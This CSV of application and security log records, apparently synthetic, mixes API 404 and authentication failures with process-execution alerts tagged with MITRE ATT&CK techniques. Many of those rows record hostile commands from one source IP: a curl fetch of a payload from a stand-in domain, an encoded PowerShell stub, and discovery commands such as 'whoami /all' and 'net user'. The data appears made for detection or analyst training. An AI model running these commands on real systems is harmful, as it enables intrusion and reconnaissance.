sequence_no,log_id,timestamp,source,service,event_type,severity,risk_label,risk_score,method,endpoint,status_code,response_time_ms,user_id,source_ip,session_id,user_agent,host,environment,trace_id,mitre_tactic,mitre_technique_id,mitre_technique,recommendation,message
713,LOG-FB41A9200CE9,2026-07-02T15:24:28+05:30,api,load-balancer,api_route_failure,warning,api_route_risk,65,GET,/api/v1/unknown-route,404,1081,devops,172.16.0.21,sess-87f94b38,curl/8.1,api-01,development,trace-f7ee99ed53194a8e,,,,"Verify API route availability, frontend URL configuration, and deployment routing.","GET /api/v1/unknown-route?level=beginner&limit=50 404 in 1081ms (next.js: 126ms, application-code: 1024ms)"
714,LOG-3A6926D85F2B,2026-07-02T15:25:25+05:30,api,nginx,api_route_failure,warning,api_route_risk,51,GET,/api/v1/unknown-route,404,1423,keerthi,203.0.113.90,sess-229f1822,Chrome/126 Windows,worker-01,development,trace-930b8faff25a47bb,,,,"Verify API route availability, frontend URL configuration, and deployment routing.","GET /api/v1/unknown-route?level=beginner&limit=50 404 in 1423ms (next.js: 152ms, application-code: 1254ms)"
715,LOG-195765031DC4,2026-07-02T15:25:46+05:30,api,load-balancer,api_route_failure,warning,api_route_risk,46,GET,/api/learning-path-batches,404,856,api_bot,91.240.118.73,sess-1e4c8403,MobileChrome/126 Android,db-01,production,trace-1a1edbf0923144f3,,,,"Verify API route availability, frontend URL configuration, and deployment routing.","GET /api/learning-path-batches?level=beginner&limit=50 404 in 856ms (next.js: 22ms, application-code: 771ms)"
716,LOG-66F12519FC6F,2026-07-02T15:26:24+05:30,api,nextjs-app,api_route_failure,warning,api_route_risk,43,GET,/api/learning-path-batches,404,655,student01,198.51.100.42,sess-f299300f,PostmanRuntime/7.37,web-01,development,trace-a0f7f4790efe4dd8,,,,"Verify API route availability, frontend URL configuration, and deployment routing.","GET /api/learning-path-batches?level=beginner&limit=50 404 in 655ms (next.js: 26ms, application-code: 498ms)"
717,LOG-D395504E568C,2026-07-02T15:26:44+05:30,api,auth-service,api_route_failure,medium,api_route_risk,67,GET,/api/admin/legacy-users,404,770,trainer,172.16.0.33,sess-0df05ccd,curl/8.1,app-02,development,trace-4514a4a8b7494594,,,,"Verify API route availability, frontend URL configuration, and deployment routing.","GET /api/admin/legacy-users?level=beginner&limit=50 404 in 770ms (next.js: 42ms, application-code: 601ms)"
718,LOG-6F9269817306,2026-07-02T15:27:11+05:30,api,nextjs-app,api_route_failure,medium,api_route_risk,70,GET,/api/admin/legacy-users,404,767,john,192.168.1.12,sess-b9873fdc,Safari/17 macOS,gateway-01,development,trace-d76c2ad83303496b,,,,"Verify API route availability, frontend URL configuration, and deployment routing.","GET /api/admin/legacy-users?level=beginner&limit=50 404 in 767ms (next.js: 128ms, application-code: 626ms)"
719,LOG-8E6893E6A939,2026-07-02T15:27:39+05:30,api,windows-host,api_route_failure,warning,api_route_risk,40,GET,/api/v1/unknown-route,404,1384,support,91.240.118.73,sess-db2f6804,PostmanRuntime/7.37,api-01,staging,trace-638291ecf91b4ab2,,,,"Verify API route availability, frontend URL configuration, and deployment routing.","GET /api/v1/unknown-route?level=beginner&limit=50 404 in 1384ms (next.js: 139ms, application-code: 1269ms)"
720,LOG-34BE47A19DAD,2026-07-02T15:28:48+05:30,api,nextjs-app,api_route_failure,medium,api_route_risk,54,GET,/api/admin/legacy-users,404,1373,john,203.0.113.90,sess-a230f2db,Firefox/124 Windows,web-01,development,trace-72642d3188334fd3,,,,"Verify API route availability, frontend URL configuration, and deployment routing.","GET /api/admin/legacy-users?level=beginner&limit=50 404 in 1373ms (next.js: 152ms, application-code: 1231ms)"
721,LOG-0F59441BCB99,2026-07-02T15:28:58+05:30,api,auth-service,api_route_failure,medium,api_route_risk,61,GET,/api/admin/legacy-users,404,1559,keerthi,103.14.88.2,sess-29f4a28e,PostmanRuntime/7.37,gateway-01,staging,trace-cbfc5be6ecf543f1,,,,"Verify API route availability, frontend URL configuration, and deployment routing.","GET /api/admin/legacy-users?level=beginner&limit=50 404 in 1559ms (next.js: 44ms, application-code: 1517ms)"
722,LOG-1C50BC336737,2026-07-02T15:29:11+05:30,api,mongodb,api_route_failure,medium,api_route_risk,60,GET,/api/learning-path-batches,404,1269,manager,203.0.113.90,sess-794462d2,BotProbe/1.0,worker-01,staging,trace-3002f159f1544e63,,,,"Verify API route availability, frontend URL configuration, and deployment routing.","GET /api/learning-path-batches?level=beginner&limit=50 404 in 1269ms (next.js: 110ms, application-code: 1112ms)"
723,LOG-5AB43B7DF5C5,2026-07-02T15:30:00+05:30,system,windows-host,process_execution,critical,security_risk,78,,,,,admin,185.220.101.45,sess-7bac028e,,app-01,production,trace-8f782e4f1f6a40df,Execution,T1059,Command and Scripting Interpreter,"Investigate source, validate account activity, apply rate limiting, and review access controls.","process_execution user=admin host=app-01 command=""powershell -enc SQBFAFgA"" source_ip=185.220.101.45"
724,LOG-786AE40961B1,2026-07-02T15:30:12+05:30,api,api-gateway,api_route_failure,medium,api_route_risk,60,GET,/api/learning-path-batches,404,1442,trainer,172.16.0.33,sess-ade884a8,PostmanRuntime/7.37,app-02,staging,trace-8f1640262b434327,,,,"Verify API route availability, frontend URL configuration, and deployment routing.","GET /api/learning-path-batches?level=beginner&limit=50 404 in 1442ms (next.js: 50ms, application-code: 1423ms)"
725,LOG-F1251D6F2659,2026-07-02T15:30:32+05:30,system,linux-host,process_execution,high,security_risk,84,,,,,admin,185.220.101.45,sess-57fca03e,,db-01,development,trace-c201a4dbd8f14892,Discovery,T1082,System Information Discovery,"Investigate source, validate account activity, apply rate limiting, and review access controls.","process_execution user=admin host=app-01 command=""whoami /all"" source_ip=185.220.101.45"
726,LOG-20B14D6A332C,2026-07-02T15:31:04+05:30,system,windows-host,process_execution,critical,security_risk,91,,,,,admin,185.220.101.45,sess-1d42e6c5,,app-01,production,trace-62e46a32e1c349cd,Discovery,T1082,System Information Discovery,"Investigate source, validate account activity, apply rate limiting, and review access controls.","process_execution user=admin host=app-01 command=""net user"" source_ip=185.220.101.45"
727,LOG-C077D121D2F2,2026-07-02T15:31:12+05:30,api,frontend-browser,api_route_failure,warning,api_route_risk,62,GET,/api/v1/unknown-route,404,1601,student01,192.168.1.12,sess-0c655e34,Safari/17 macOS,gateway-01,development,trace-4c8cc1b261ca4f85,,,,"Verify API route availability, frontend URL configuration, and deployment routing.","GET /api/v1/unknown-route?level=beginner&limit=50 404 in 1601ms (next.js: 131ms, application-code: 1434ms)"
728,LOG-9B7AE385F9A0,2026-07-02T15:31:36+05:30,system,linux-host,process_execution,critical,security_risk,81,,,,,admin,185.220.101.45,sess-6a788e57,,db-01,development,trace-27f3833afcb049fa,Discovery,T1082,System Information Discovery,"Investigate source, validate account activity, apply rate limiting, and review access controls.","process_execution user=admin host=app-01 command=""systeminfo"" source_ip=185.220.101.45"
729,LOG-F1F48DCD7A1A,2026-07-02T15:31:45+05:30,api,nextjs-app,api_route_failure,medium,api_route_risk,62,GET,/api/admin/legacy-users,404,1615,api_bot,192.168.1.11,sess-1778c240,MobileChrome/126 Android,app-01,production,trace-d478eeba7f254be7,,,,"Verify API route availability, frontend URL configuration, and deployment routing.","GET /api/admin/legacy-users?level=beginner&limit=50 404 in 1615ms (next.js: 133ms, application-code: 1437ms)"
730,LOG-27AEDFD27367,2026-07-02T15:31:55+05:30,api,firewall,api_route_failure,medium,api_route_risk,68,GET,/api/v1/unknown-route,404,1527,student01,91.240.118.73,sess-e6538a42,MobileChrome/126 Android,api-01,production,trace-4b3f8111c7ae4007,,,,"Verify API route availability, frontend URL configuration, and deployment routing.","GET /api/v1/unknown-route?level=beginner&limit=50 404 in 1527ms (next.js: 158ms, application-code: 1518ms)"
731,LOG-7704B6BFCD2C,2026-07-02T15:32:08+05:30,system,linux-host,process_execution,high,security_risk,82,,,,,admin,185.220.101.45,sess-7b1d9cc0,,app-02,staging,trace-49278aed813f437b,Execution,T1059,Command and Scripting Interpreter,"Investigate source, validate account activity, apply rate limiting, and review access controls.","process_execution user=admin host=app-01 command=""curl http://unknown-domain.example/payload"" source_ip=185.220.101.45"
732,LOG-9B171A8C6D1E,2026-07-02T15:32:40+05:30,system,linux-host,process_execution,high,security_risk,88,,,,,admin,185.220.101.45,sess-88660189,,app-02,staging,trace-4f7e98b7971d4352,Execution,T1059,Command and Scripting Interpreter,"Investigate source, validate account activity, apply rate limiting, and review access controls.","process_execution user=admin host=app-01 command=""bash -c id"" source_ip=185.220.101.45"
733,LOG-8874BFECC8F4,2026-07-02T15:33:00+05:30,api,auth-service,api_route_failure,medium,api_route_risk,48,GET,/api/admin/legacy-users,404,1256,trainer,185.220.101.45,sess-8a2d6c77,BotProbe/1.0,app-02,production,trace-0e766eac89994686,,,,"Verify API route availability, frontend URL configuration, and deployment routing.","GET /api/admin/legacy-users?level=beginner&limit=50 404 in 1256ms (next.js: 13ms, application-code: 1116ms)"
734,LOG-07BB52C5AEF9,2026-07-02T15:33:12+05:30,system,windows-host,process_execution,high,security_risk,88,,,,,admin,185.220.101.45,sess-534b19cc,,worker-01,development,trace-c96b178989df4808,Execution,T1059,Command and Scripting Interpreter,"Investigate source, validate account activity, apply rate limiting, and review access controls.","process_execution user=admin host=app-01 command=""powershell -enc SQBFAFgA"" source_ip=185.220.101.45"
735,LOG-05E711EEE8A2,2026-07-02T15:33:42+05:30,api,nginx,api_route_failure,warning,api_route_risk,49,GET,/api/v1/unknown-route,404,726,finance_user,10.0.0.8,sess-f64b2bf0,MobileChrome/126 Android,app-02,development,trace-b302f8d0acd044a4,,,,"Verify API route availability, frontend URL configuration, and deployment routing.","GET /api/v1/unknown-route?level=beginner&limit=50 404 in 726ms (next.js: 17ms, application-code: 707ms)"
736,LOG-6FA969A4BD51,2026-07-02T15:33:44+05:30,system,linux-host,process_execution,high,security_risk,96,,,,,admin,185.220.101.45,sess-3b13426f,,web-01,development,trace-7713824165824445,Discovery,T1082,System Information Discovery,"Investigate source, validate account activity, apply rate limiting, and review access controls.","process_execution user=admin host=app-01 command=""whoami /all"" source_ip=185.220.101.45"
737,LOG-33858310304E,2026-07-02T15:33:55+05:30,api,payment-service,api_route_failure,medium,api_route_risk,70,GET,/api/v1/unknown-route,404,1274,student01,10.0.0.5,sess-09626e4d,Chrome/126 Windows,web-01,production,trace-ae8f5129f2fc44f3,,,,"Verify API route availability, frontend URL configuration, and deployment routing.","GET /api/v1/unknown-route?level=beginner&limit=50 404 in 1274ms (next.js: 118ms, application-code: 1142ms)"
738,LOG-38A0D8655579,2026-07-02T15:34:16+05:30,system,windows-host,process_execution,critical,security_risk,91,,,,,admin,185.220.101.45,sess-75b26f0c,,app-01,production,trace-dd51ad926df345ed,Discovery,T1082,System Information Discovery,"Investigate source, validate account activity, apply rate limiting, and review access controls.","process_execution user=admin host=app-01 command=""net user"" source_ip=185.220.101.45"
739,LOG-A83215F8611F,2026-07-02T15:34:48+05:30,system,linux-host,process_execution,critical,security_risk,93,,,,,admin,185.220.101.45,sess-245c1fd7,,app-01,production,trace-ace1463991374e18,Discovery,T1082,System Information Discovery,"Investigate source, validate account activity, apply rate limiting, and review access controls.","process_execution user=admin host=app-01 command=""systeminfo"" source_ip=185.220.101.45"
740,LOG-98C23D8C8A6D,2026-07-02T15:35:04+05:30,api,frontend-browser,api_route_failure,warning,api_route_risk,70,GET,/api/v1/unknown-route,404,1630,support,185.220.101.45,sess-2c2592da,Safari/17 macOS,gateway-01,staging,trace-35cb4090ec93420f,,,,"Verify API route availability, frontend URL configuration, and deployment routing.","GET /api/v1/unknown-route?level=beginner&limit=50 404 in 1630ms (next.js: 83ms, application-code: 1513ms)"
741,LOG-5D38445ACB46,2026-07-02T15:35:20+05:30,system,linux-host,process_execution,critical,security_risk,87,,,,,admin,185.220.101.45,sess-38ad4276,,web-01,staging,trace-64f6c494706741c8,Execution,T1059,Command and Scripting Interpreter,"Investigate source, validate account activity, apply rate limiting, and review access controls.","process_execution user=admin host=app-01 command=""curl http://unknown-domain.example/payload"" source_ip=185.220.101.45"
742,LOG-B50C1A459FE1,2026-07-02T15:35:52+05:30,system,linux-host,process_execution,critical,security_risk,88,,,,,admin,185.220.101.45,sess-2c06343a,,api-01,staging,trace-e64a7cff45184525,Execution,T1059,Command and Scripting Interpreter,"Investigate source, validate account activity, apply rate limiting, and review access controls.","process_execution user=admin host=app-01 command=""bash -c id"" source_ip=185.220.101.45"
743,LOG-5D135E82D46F,2026-07-02T15:36:03+05:30,api,firewall,api_route_failure,medium,api_route_risk,42,GET,/api/learning-path-batches,404,986,admin,88.214.26.18,sess-a99b16b7,Firefox/124 Windows,app-02,staging,trace-de3a883988944b26,,,,"Verify API route availability, frontend URL configuration, and deployment routing.","GET /api/learning-path-batches?level=beginner&limit=50 404 in 986ms (next.js: 121ms, application-code: 923ms)"
744,LOG-B3C3378F9C11,2026-07-02T15:36:13+05:30,api,nginx,api_route_failure,medium,api_route_risk,56,GET,/api/v1/unknown-route,404,1497,api_bot,172.16.0.33,sess-2e260af7,Firefox/124 Windows,gateway-01,development,trace-f748b2904bf64398,,,,"Verify API route availability, frontend URL configuration, and deployment routing.","GET /api/v1/unknown-route?level=beginner&limit=50 404 in 1497ms (next.js: 80ms, application-code: 1477ms)"
745,LOG-38DE88D405C2,2026-07-02T15:36:24+05:30,system,windows-host,process_execution,high,security_risk,90,,,,,admin,185.220.101.45,sess-77eddc63,,app-02,development,trace-6cacd18bade6465b,Execution,T1059,Command and Scripting Interpreter,"Investigate source, validate account activity, apply rate limiting, and review access controls.","process_execution user=admin host=app-01 command=""powershell -enc SQBFAFgA"" source_ip=185.220.101.45"
746,LOG-15BD71873209,2026-07-02T15:36:56+05:30,system,linux-host,process_execution,critical,security_risk,88,,,,,admin,185.220.101.45,sess-dc29ca27,,app-02,staging,trace-051f3a022f304e87,Discovery,T1082,System Information Discovery,"Investigate source, validate account activity, apply rate limiting, and review access controls.","process_execution user=admin host=app-01 command=""whoami /all"" source_ip=185.220.101.45"
747,LOG-1F3C486340D6,2026-07-02T15:37:00+05:30,api,linux-host,api_route_failure,medium,api_route_risk,47,GET,/api/v1/unknown-route,404,1037,hr_user,185.220.101.45,sess-26c19970,Python-requests/2.32,worker-01,production,trace-6e7402f5161e4612,,,,"Verify API route availability, frontend URL configuration, and deployment routing.","GET /api/v1/unknown-route?level=beginner&limit=50 404 in 1037ms (next.js: 119ms, application-code: 971ms)"
748,LOG-CFD1F4376E7C,2026-07-02T15:37:10+05:30,api,linux-host,api_route_failure,medium,api_route_risk,64,GET,/api/learning-path-batches,404,761,john,192.168.1.10,sess-e8cdee72,MobileChrome/126 Android,app-01,development,trace-531ab331d6404930,,,,"Verify API route availability, frontend URL configuration, and deployment routing.","GET /api/learning-path-batches?level=beginner&limit=50 404 in 761ms (next.js: 108ms, application-code: 622ms)"
749,LOG-779E8166A718,2026-07-02T15:37:28+05:30,system,windows-host,process_execution,high,security_risk,88,,,,,admin,185.220.101.45,sess-2a291d62,,api-01,production,trace-4e45db65a7304d48,Discovery,T1082,System Information Discovery,"Investigate source, validate account activity, apply rate limiting, and review access controls.","process_execution user=admin host=app-01 command=""net user"" source_ip=185.220.101.45"
750,LOG-A2D5217050FF,2026-07-02T15:37:30+05:30,api,frontend-browser,api_route_failure,medium,api_route_risk,60,GET,/api/learning-path-batches,404,1531,analyst,198.51.100.42,sess-5d7288dc,Firefox/124 Windows,app-02,production,trace-a8f7343c654a4a66,,,,"Verify API route availability, frontend URL configuration, and deployment routing.","GET /api/learning-path-batches?level=beginner&limit=50 404 in 1531ms (next.js: 79ms, application-code: 1472ms)"
751,LOG-4E035A7C7131,2026-07-02T15:38:00+05:30,system,linux-host,process_execution,high,security_risk,79,,,,,admin,185.220.101.45,sess-8105ae1a,,app-02,development,trace-a362df2557794f68,Discovery,T1082,System Information Discovery,"Investigate source, validate account activity, apply rate limiting, and review access controls.","process_execution user=admin host=app-01 command=""systeminfo"" source_ip=185.220.101.45"
752,LOG-B8A9C7BE72C5,2026-07-02T15:38:02+05:30,api,auth-service,api_route_failure,warning,api_route_risk,50,GET,/api/v1/unknown-route,404,1700,trainer,198.51.100.42,sess-fdeeef53,Python-requests/2.32,app-02,staging,trace-a90733d8df8f4f43,,,,"Verify API route availability, frontend URL configuration, and deployment routing.","GET /api/v1/unknown-route?level=beginner&limit=50 404 in 1700ms (next.js: 159ms, application-code: 1550ms)"
753,LOG-397B2ED57446,2026-07-02T15:38:32+05:30,system,linux-host,process_execution,high,security_risk,76,,,,,admin,185.220.101.45,sess-5e67854f,,app-01,staging,trace-4fa6f6e8f8514ccd,Execution,T1059,Command and Scripting Interpreter,"Investigate source, validate account activity, apply rate limiting, and review access controls.","process_execution user=admin host=app-01 command=""curl http://unknown-domain.example/payload"" source_ip=185.220.101.45"
754,LOG-D79737523143,2026-07-02T15:38:53+05:30,api,auth-service,api_route_failure,warning,api_route_risk,53,GET,/api/v1/unknown-route,404,1365,student02,45.67.21.88,sess-99b9a7f0,Edge/126 Windows,gateway-01,production,trace-a621ebecef9a446b,,,,"Verify API route availability, frontend URL configuration, and deployment routing.","GET /api/v1/unknown-route?level=beginner&limit=50 404 in 1365ms (next.js: 19ms, application-code: 1346ms)"
755,LOG-65AD00373CBD,2026-07-02T15:39:04+05:30,system,linux-host,process_execution,high,security_risk,96,,,,,admin,185.220.101.45,sess-06418a84,,app-01,production,trace-1ecef62ce7914a88,Execution,T1059,Command and Scripting Interpreter,"Investigate source, validate account activity, apply rate limiting, and review access controls.","process_execution user=admin host=app-01 command=""bash -c id"" source_ip=185.220.101.45"
756,LOG-B999C27E4FFD,2026-07-02T15:39:06+05:30,api,payment-service,api_route_failure,warning,api_route_risk,41,GET,/api/admin/legacy-users,404,1562,api_bot,88.214.26.18,sess-b87cd413,PostmanRuntime/7.37,api-01,production,trace-34999865d7564908,,,,"Verify API route availability, frontend URL configuration, and deployment routing.","GET /api/admin/legacy-users?level=beginner&limit=50 404 in 1562ms (next.js: 12ms, application-code: 1397ms)"
757,LOG-71904FE8B2F5,2026-07-02T15:39:36+05:30,system,windows-host,process_execution,high,security_risk,89,,,,,admin,185.220.101.45,sess-27b53631,,db-01,production,trace-6ce3df142d284930,Execution,T1059,Command and Scripting Interpreter,"Investigate source, validate account activity, apply rate limiting, and review access controls.","process_execution user=admin host=app-01 command=""powershell -enc SQBFAFgA"" source_ip=185.220.101.45"
758,LOG-4C2DC9DCC34A,2026-07-02T15:39:56+05:30,api,payment-service,api_route_failure,warning,api_route_risk,70,GET,/api/admin/legacy-users,404,1306,support,91.240.118.73,sess-41c8ed3d,BotProbe/1.0,gateway-01,staging,trace-eba86ecc48ba4d9b,,,,"Verify API route availability, frontend URL configuration, and deployment routing.","GET /api/admin/legacy-users?level=beginner&limit=50 404 in 1306ms (next.js: 158ms, application-code: 1255ms)"
759,LOG-5F7CC837338A,2026-07-02T15:40:08+05:30,system,linux-host,process_execution,critical,security_risk,75,,,,,admin,185.220.101.45,sess-1e4ab9e6,,web-01,production,trace-488a6005c05542ad,Discovery,T1082,System Information Discovery,"Investigate source, validate account activity, apply rate limiting, and review access controls.","process_execution user=admin host=app-01 command=""whoami /all"" source_ip=185.220.101.45"
760,LOG-312CB680CDE4,2026-07-02T15:40:40+05:30,system,windows-host,process_execution,high,security_risk,92,,,,,admin,185.220.101.45,sess-52bd3f28,,app-01,staging,trace-26a3961af9ae45fc,Discovery,T1082,System Information Discovery,"Investigate source, validate account activity, apply rate limiting, and review access controls.","process_execution user=admin host=app-01 command=""net user"" source_ip=185.220.101.45"
761,LOG-95A4FE0DF065,2026-07-02T15:41:01+05:30,api,mongodb,api_route_failure,warning,api_route_risk,46,GET,/api/v1/unknown-route,404,1577,admin,88.214.26.18,sess-79dc1b1f,Python-requests/2.32,app-02,production,trace-1320cf334765476b,,,,"Verify API route availability, frontend URL configuration, and deployment routing.","GET /api/v1/unknown-route?level=beginner&limit=50 404 in 1577ms (next.js: 61ms, application-code: 1496ms)"
762,LOG-C782BBC4553D,2026-07-02T15:41:12+05:30,system,linux-host,process_execution,critical,security_risk,77,,,,,admin,185.220.101.45,sess-f2a90453,,app-02,staging,trace-5487cd45e31b4e55,Discovery,T1082,System Information Discovery,"Investigate source, validate account activity, apply rate limiting, and review access controls.","process_execution user=admin host=app-01 command=""systeminfo"" source_ip=185.220.101.45"
763,LOG-096BCADA65E8,2026-07-02T15:41:40+05:30,api,nginx,api_route_failure,medium,api_route_risk,59,GET,/api/admin/legacy-users,404,1061,devops,203.0.113.90,sess-f461332e,MobileChrome/126 Android,worker-01,production,trace-59d714235c2c40f0,,,,"Verify API route availability, frontend URL configuration, and deployment routing.","GET /api/admin/legacy-users?level=beginner&limit=50 404 in 1061ms (next.js: 31ms, application-code: 1028ms)"
764,LOG-F056B2172C2A,2026-07-02T15:41:44+05:30,system,linux-host,process_execution,critical,security_risk,95,,,,,admin,185.220.101.45,sess-456a3b16,,api-01,development,trace-44b39ddc53f648cb,Execution,T1059,Command and Scripting Interpreter,"Investigate source, validate account activity, apply rate limiting, and review access controls.","process_execution user=admin host=app-01 command=""curl http://unknown-domain.example/payload"" source_ip=185.220.101.45"
765,LOG-162778199D62,2026-07-02T15:41:59+05:30,api,api-gateway,api_route_failure,medium,api_route_risk,69,GET,/api/v1/unknown-route,404,1228,finance_user,172.16.0.21,sess-f12a16a1,BotProbe/1.0,web-01,development,trace-c81befc345d4456e,,,,"Verify API route availability, frontend URL configuration, and deployment routing.","GET /api/v1/unknown-route?level=beginner&limit=50 404 in 1228ms (next.js: 40ms, application-code: 1143ms)"
766,LOG-A99D433A161D,2026-07-02T15:42:16+05:30,system,linux-host,process_execution,high,security_risk,81,,,,,admin,185.220.101.45,sess-ccc24b82,,db-01,development,trace-7067fcd9ee394410,Execution,T1059,Command and Scripting Interpreter,"Investigate source, validate account activity, apply rate limiting, and review access controls.","process_execution user=admin host=app-01 command=""bash -c id"" source_ip=185.220.101.45"
767,LOG-6221DA4A80A0,2026-07-02T15:42:39+05:30,api,firewall,api_route_failure,medium,api_route_risk,70,GET,/api/admin/legacy-users,404,1132,devops,192.168.2.15,sess-1bdc0f17,Edge/126 Windows,app-02,development,trace-8ae839a901424577,,,,"Verify API route availability, frontend URL configuration, and deployment routing.","GET /api/admin/legacy-users?level=beginner&limit=50 404 in 1132ms (next.js: 89ms, application-code: 1106ms)"
768,LOG-CEBE16ED5C7D,2026-07-02T15:42:48+05:30,system,windows-host,process_execution,high,security_risk,98,,,,,admin,185.220.101.45,sess-bdeb01dc,,db-01,development,trace-847a30bd1c554737,Execution,T1059,Command and Scripting Interpreter,"Investigate source, validate account activity, apply rate limiting, and review access controls.","process_execution user=admin host=app-01 command=""powershell -enc SQBFAFgA"" source_ip=185.220.101.45"
769,LOG-0675C07B5699,2026-07-02T15:43:04+05:30,api,payment-service,api_route_failure,warning,api_route_risk,67,GET,/api/learning-path-batches,404,1502,api_bot,192.168.1.11,sess-af8b6ff0,curl/8.1,db-01,production,trace-d3d6aef5986044cf,,,,"Verify API route availability, frontend URL configuration, and deployment routing.","GET /api/learning-path-batches?level=beginner&limit=50 404 in 1502ms (next.js: 74ms, application-code: 1406ms)"
770,LOG-BA102FB1D26F,2026-07-02T15:43:20+05:30,system,linux-host,process_execution,critical,security_risk,97,,,,,admin,185.220.101.45,sess-968ff282,,web-01,production,trace-88ab23f8dfbb4239,Discovery,T1082,System Information Discovery,"Investigate source, validate account activity, apply rate limiting, and review access controls.","process_execution user=admin host=app-01 command=""whoami /all"" source_ip=185.220.101.45"
771,LOG-BBD00C155F59,2026-07-02T15:43:50+05:30,api,frontend-browser,api_route_failure,warning,api_route_risk,58,GET,/api/learning-path-batches,404,1267,support,10.0.0.5,sess-14253819,Edge/126 Windows,app-02,staging,trace-550bb824c78c4354,,,,"Verify API route availability, frontend URL configuration, and deployment routing.","GET /api/learning-path-batches?level=beginner&limit=50 404 in 1267ms (next.js: 37ms, application-code: 1215ms)"
772,LOG-9B88E28E4A16,2026-07-02T15:43:52+05:30,system,windows-host,process_execution,critical,security_risk,93,,,,,admin,185.220.101.45,sess-d7babdc7,,db-01,production,trace-02616175a27b4706,Discovery,T1082,System Information Discovery,"Investigate source, validate account activity, apply rate limiting, and review access controls.","process_execution user=admin host=app-01 command=""net user"" source_ip=185.220.101.45"
773,LOG-A47128531863,2026-07-02T15:44:24+05:30,system,linux-host,process_execution,high,security_risk,86,,,,,admin,185.220.101.45,sess-3e73c72c,,app-01,staging,trace-b3738522669145c6,Discovery,T1082,System Information Discovery,"Investigate source, validate account activity, apply rate limiting, and review access controls.","process_execution user=admin host=app-01 command=""systeminfo"" source_ip=185.220.101.45"
774,LOG-47B5ED7BB4F5,2026-07-02T15:44:43+05:30,api,frontend-browser,api_route_failure,medium,api_route_risk,47,GET,/api/learning-path-batches,404,833,api_bot,10.0.0.8,sess-1027d5a4,BotProbe/1.0,api-01,development,trace-701ef3cc7aaa4922,,,,"Verify API route availability, frontend URL configuration, and deployment routing.","GET /api/learning-path-batches?level=beginner&limit=50 404 in 833ms (next.js: 100ms, application-code: 730ms)"
775,LOG-4266F8B3E7F2,2026-07-02T15:44:56+05:30,system,linux-host,process_execution,critical,security_risk,90,,,,,admin,185.220.101.45,sess-57c033ce,,app-02,staging,trace-39f29d9466334f1a,Execution,T1059,Command and Scripting Interpreter,"Investigate source, validate account activity, apply rate limiting, and review access controls.","process_execution user=admin host=app-01 command=""curl http://unknown-domain.example/payload"" source_ip=185.220.101.45"
776,LOG-A8941CAD9400,2026-07-02T15:45:12+05:30,auth,mongodb,authentication_failure,high,auth_risk,72,GET,/api/verify-admin-access,401,344,admin,45.67.21.88,sess-b88a7e3d,BotProbe/1.0,worker-01,development,trace-a2e7e622d586414d,,,,"Review token/session handling, failed attempts, and authentication middleware.","GET /api/verify-admin-access 401 in 344ms (next.js: 10ms, application-code: 311ms)"
777,LOG-2EF8B6CF5905,2026-07-02T15:45:28+05:30,system,linux-host,process_execution,critical,security_risk,97,,,,,admin,185.220.101.45,sess-7a5bf3ee,,app-02,staging,trace-5e8f610ac0cd4132,Execution,T1059,Command and Scripting Interpreter,"Investigate source, validate account activity, apply rate limiting, and review access controls.","process_execution user=admin host=app-01 command=""bash -c id"" source_ip=185.220.101.45"
778,LOG-DFCA940C92A1,2026-07-02T15:45:40+05:30,auth,payment-service,authentication_failure,high,auth_risk,65,GET,/api/verify-admin-access,401,383,analyst,198.51.100.42,sess-7d41eeb7,MobileChrome/126 Android,app-01,production,trace-2ad0328d438f44be,,,,"Review token/session handling, failed attempts, and authentication middleware.","GET /api/verify-admin-access 401 in 383ms (next.js: 67ms, application-code: 332ms)"
779,LOG-0834DD4D681F,2026-07-02T15:46:34+05:30,auth,auth-service,authentication_failure,high,auth_risk,63,GET,/api/auth,401,88,support,172.16.0.33,sess-74a94bc9,Chrome/126 Windows,web-01,development,trace-99798177044c4a49,Initial Access,T1078,Valid Accounts,"Review token/session handling, failed attempts, and authentication middleware.","GET /api/auth 401 in 88ms (next.js: 5ms, application-code: 66ms)"
780,LOG-9CBD8AD0C579,2026-07-02T15:46:55+05:30,auth,linux-host,authentication_failure,high,auth_risk,64,GET,/api/auth,403,137,student01,172.16.0.33,sess-c2c52f3d,PostmanRuntime/7.37,api-01,development,trace-23d0fb0eae5d4474,,,,"Review token/session handling, failed attempts, and authentication middleware.","GET /api/auth 403 in 137ms (next.js: 53ms, application-code: 76ms)"
781,LOG-A714270F0A68,2026-07-02T15:47:28+05:30,auth,windows-host,authentication_failure,warning,auth_risk,81,GET,/api/auth,401,57,support,88.214.26.18,sess-0fdb6186,Safari/17 macOS,gateway-01,staging,trace-10cbd6ba0c074c82,,,,"Review token/session handling, failed attempts, and authentication middleware.","GET /api/auth 401 in 57ms (next.js: 25ms, application-code: 37ms)"
